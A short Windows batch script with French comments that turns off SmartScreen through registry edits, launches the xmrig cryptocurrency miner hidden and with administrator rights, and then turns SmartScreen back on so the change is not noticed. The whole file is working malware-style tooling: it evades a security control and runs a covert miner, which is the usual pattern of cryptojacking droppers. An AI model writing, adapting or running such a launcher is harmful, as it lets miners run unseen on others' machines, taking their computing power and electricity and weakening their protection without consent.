@echo off
cd /d "%~dp0"

:: Désactiver SmartScreen temporairement
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f

:: Lancer xmrig en arrière-plan sans fenêtre et en administrateur
powershell -WindowStyle Hidden -Command "Start-Process xmrig.exe -WindowStyle Hidden -Verb RunAs"

:: Attendre 10 secondes pour que xmrig démarre (ajuste si besoin)
timeout /t 10 /nobreak >nul

:: Réactiver SmartScreen après le démarrage de xmrig
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Warn /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 1 /f

exit
